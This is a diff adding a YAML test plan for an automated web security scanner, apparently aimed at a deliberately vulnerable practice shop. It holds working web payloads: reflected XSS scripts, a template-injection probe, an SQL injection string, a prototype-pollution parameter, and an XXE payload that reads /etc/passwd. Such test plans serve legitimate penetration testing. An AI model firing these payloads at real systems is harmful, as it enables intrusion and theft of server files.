@@ -1,0 +1,105 @@
+id: ginjuice-basic-sqli-fixed
+name: Juice Shop Recon & Exploitation Tests (Resilient Login)
+mode: predator
+retry_on_failure: true
+
+steps:
+  - id: login
+    phase: access
+    description: Try login with combined credentials
+    action:
+      method: POST
+      path: /login
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      payload: "username=carlos&password=hunter2"
+    extract:
+      path: headers.set-cookie
+      save_as: session_cookie
+    validate:
+      status_code: 200
+      contains: "Welcome"
+    retry_on_failure: true
+
+  - id: my-account
+    phase: reconnaissance
+    description: Access /my-account using session cookie
+    action:
+      method: GET
+      path: /my-account
+      headers:
+        Cookie: "{{session_cookie}}"
+    validate:
+      status_code: 200
+    requires:
+      - login
+
+  - id: reflected-xss-login
+    phase: exploitation
+    description: Test reflected XSS on login page
+    action:
+      method: GET
+      path: /login?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+    validate:
+      status_code: 200
+
+  - id: template-injection
+    phase: exploitation
+    description: Server-side template injection
+    action:
+      method: GET
+      path: /catalog?category={{7+7}}
+    validate:
+      status_code: 200
+      contains: "14"
+
+  - id: sql-injection
+    phase: exploitation
+    description: SQL injection test on catalog
+    action:
+      method: GET
+      path: /catalog?category=' OR '1'='1
+    validate:
+      status_code: 200
+
+  - id: reflected-xss-subscribe
+    phase: exploitation
+    description: XSS test via /catalog/subscribe
+    action:
+      method: GET
+      path: /catalog/subscribe?email=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+    validate:
+      status_code: 405
+
+  - id: xxe-stock-endpoint
+    phase: exploitation
+    description: XXE injection probe via stock endpoint
+    action:
+      method: POST
+      path: /catalog/product/stock
+      headers:
+        Content-Type: application/xml
+      payload: |
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <stockCheck><productId>&xxe;</productId></stockCheck>
+    validate:
+      status_code: 500
+
+  - id: blog-client-pollution
+    phase: exploitation
+    description: Client-side prototype pollution test
+    action:
+      method: GET
+      path: /blog?__proto__[admin]=true
+    validate:
+      status_code: 200
+
+  - id: vulnerable-angular
+    phase: reconnaissance
+    description: Retrieve known vulnerable Angular library
+    action:
+      method: GET
+      path: /resources/js/angular_1-7-7.js
+    validate:
+      status_code: 200
